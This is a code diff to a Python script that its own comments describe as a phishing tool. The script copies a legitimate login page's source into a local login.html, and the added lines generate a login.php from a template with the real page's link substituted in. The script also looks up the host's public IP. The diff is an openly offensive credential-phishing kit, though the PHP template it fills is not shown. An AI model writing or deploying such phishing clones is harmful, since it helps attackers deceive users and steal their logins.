@@ -1,11 +1,12 @@
 import requests
 import pathlib
 import argparse
+import re
 
 
 def main() -> None:
     # Path to the phishing page
-    path = str(pathlib.Path(__file__).parent.joinpath("login.html"))
+    path = str(CWD.joinpath("login.html"))
     try:
         # Attempt to get the legitimate login page source code
         response = requests.get(PAGE)
@@ -28,6 +29,13 @@ def main() -> None:
     except requests.exceptions.RequestException as err:  # The provided link was unreachable
         print(err)
 
+    # Create the php script from existing template
+    with open(str(CWD.joinpath("template.php")), "r") as f:
+        cont = f.read()
+    cont = re.sub("PAGELINK", PAGE, cont)
+    with open(str(CWD.joinpath("login.php")), "w") as f:
+        f.write(cont)
+
 
 if __name__ == "__main__":
     # Initialize the parser
@@ -46,4 +54,5 @@ if __name__ == "__main__":
     except requests.exceptions.RequestException as err:
         print(f"Error retrieving host public IP address - {err}")
     PAGE = args.login_page  # Legitimate login page link
+    CWD = pathlib.Path(__file__).parent  # Current working directory
     main()
